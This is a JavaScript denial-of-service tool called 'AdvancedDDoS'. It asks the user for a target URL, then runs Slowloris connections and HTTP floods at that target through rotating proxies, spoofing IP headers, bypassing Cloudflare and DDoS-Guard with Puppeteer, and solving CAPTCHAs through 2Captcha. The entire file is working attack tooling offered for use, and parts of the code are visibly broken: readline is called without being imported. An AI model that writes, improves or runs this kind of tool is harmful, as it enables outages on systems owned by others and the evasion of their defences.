const net = require('net');
const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const readlineSync = require('readline-sync');
const { performance } = require('perf_hooks');
const chalk = require('chalk');
const figlet = require('figlet');

// Advanced DDoS Configurations
const headersDelay = 5000; // Delay between sending headers (milliseconds)
const captchaAPIKey = 'YOUR_2CAPTCHA_API_KEY'; // Add your 2Captcha API key
const proxies = [];
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
];

// Menu Display
const displayMenu = (target, time, rate, threads, proxyFile, githubUrl) => {
    console.log(chalk.cyanBright(figlet.textSync('AdvancedDDoS', { horizontalLayout: 'full' })));
    console.log(chalk.yellow('-> Target : ') + chalk.green(target));
    console.log(chalk.yellow('-> Time : ') + chalk.green(time));
    console.log(chalk.yellow('-> Rate : ') + chalk.green(rate));
    console.log(chalk.yellow('-> Threads : ') + chalk.green(threads));
    console.log(chalk.yellow('-> ProxyFile : ') + chalk.green(proxyFile));
    console.log(chalk.yellow('-> Github : ') + chalk.green(githubUrl));
    console.log();
};

// Load Proxies
const loadProxies = async (proxyFile) => {
    const rl = readline.createInterface({
        input: fs.createReadStream(proxyFile),
        crlfDelay: Infinity
    });
    for await (const line of rl) {
        if (line.trim()) {
            proxies.push(line.trim());
        }
    }
};

// Get Random Proxy
const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)];

// CAPTCHA Solver using 2Captcha
const solveCaptcha = async (siteKey, pageUrl) => {
    const captchaIdResponse = await axios.post(`http://2captcha.com/in.php?key=${captchaAPIKey}&method=userrecaptcha&googlekey=${siteKey}&pageurl=${pageUrl}`);
    const captchaId = captchaIdResponse.data.split('|')[1];
    console.log('Captcha solving initiated...');

    let solved = false;
    let captchaToken = null;

    while (!solved) {
        const response = await axios.get(`http://2captcha.com/res.php?key=${captchaAPIKey}&action=get&id=${captchaId}`);
        if (response.data.includes('OK')) {
            captchaToken = response.data.split('|')[1];
            solved = true;
        } else {
            console.log('Captcha still solving...');
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }

    console.log('Captcha solved successfully!');
    return captchaToken;
};

// Advanced Bot/Shield Bypass using Puppeteer
const bypassProtection = async (url) => {
    console.log('Attempting to bypass Cloudflare, DDoS-Guard, cShield, or vShield...');
    const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] });
    const page = await browser.newPage();

    await page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);
    await page.goto(url, { waitUntil: 'networkidle2' });  // Wait for all network activity to settle

    const cookies = await page.cookies();
    await browser.close();
    return cookies;
};

// Slowloris TCP Attack Function
const slowlorisAttack = async (host, port, numConnections, headersDelay, proxy) => {
    const cookies = await bypassProtection(`https://${host}`);
    
    for (let i = 0; i < numConnections; i++) {
        const socket = net.connect({ host: proxy.split(':')[0], port: proxy.split(':')[1] }, () => {
            console.log(`Opened connection ${i + 1} through proxy ${proxy}`);

            const headers = `GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\nCookie: ${cookies.map(c => `${c.name}=${c.value}`).join('; ')}\r\n\r\n`;

            socket.write(headers);

            setInterval(() => {
                socket.write(`X-Header: ${Math.random()}\r\n`);
            }, headersDelay);
        });

        socket.on('error', err => {
            console.log(`Connection ${i + 1} error: ${err}`);
        });
    }
};

// Layer 7 HTTP Flood Attack Function
const httpFloodAttack = async (url, numRequests, rate, proxy) => {
    console.log(`Starting HTTP Flood attack on ${url} with rate ${rate}...`);

    for (let i = 0; i < numRequests; i++) {
        const response = await axios.get(url, {
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'X-Forwarded-For': getRandomProxy(), // Spoof IP with proxy
            },
            proxy: {
                host: proxy.split(':')[0],
                port: parseInt(proxy.split(':')[1])
            }
        }).catch(err => {
            console.log(`Request ${i + 1} failed.`);
        });

        if (i % rate === 0) {
            await new Promise(resolve => setTimeout(resolve, 1000));  // Rate limiting control
        }
    }

    console.log('HTTP Flood attack finished.');
};

// Start Multi-Vector Attack
const startAttack = async (target, attackTime, threads, connectionsPerThread, rate, proxyFile) => {
    console.log('Checking proxies...');

    if (!fs.existsSync(proxyFile)) {
        console.log(chalk.red('Proxy file not found, proxies not loaded!'));
        return;
    } else {
        console.log('Loading proxies...');
        await loadProxies(proxyFile);
    }

    if (proxies.length === 0) {
        console.log(chalk.red('No proxies loaded!'));
        return;
    }

    console.log(`Starting multi-vector attack on ${target} with ${threads} threads...`);
    const endTime = performance.now() + (attackTime * 1000);  // Convert time to milliseconds

    const attackInterval = setInterval(() => {
        for (let i = 0; i < threads; i++) {
            const proxy = getRandomProxy();

            // Choose between Slowloris or HTTP Flood for multi-vector
            if (i % 2 === 0) {
                slowlorisAttack(target, 443, connectionsPerThread, headersDelay, proxy);
            } else {
                httpFloodAttack(`https://${target}`, connectionsPerThread, rate, proxy);
            }
        }
    }, 1000 / rate);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack finished.');
    }, attackTime * 1000);  // Stop attack after specified time
};

// Command Line Inputs
const targetURL = readlineSync.question('Enter target URL: ');
const attackTime = parseInt(readlineSync.question('Enter attack time in seconds: '), 10);
const rate = parseInt(readlineSync.question('Enter rate (connections per second): '), 10);
const threads = parseInt(readlineSync.question('Enter number of threads: '), 10);
const connectionsPerThread = parseInt(readlineSync.question('Enter connections per thread: '), 10);
const proxyFile = path.join(__dirname, 'proxy.txt');

// Display Menu
displayMenu(targetURL, attackTime, rate, threads, proxyFile, 'https://github.com/YourGitHubUsername');

// Start the Attack
const host = new URL(targetURL).host;
startAttack(host, attackTime, threads, connectionsPerThread, rate, proxyFile);
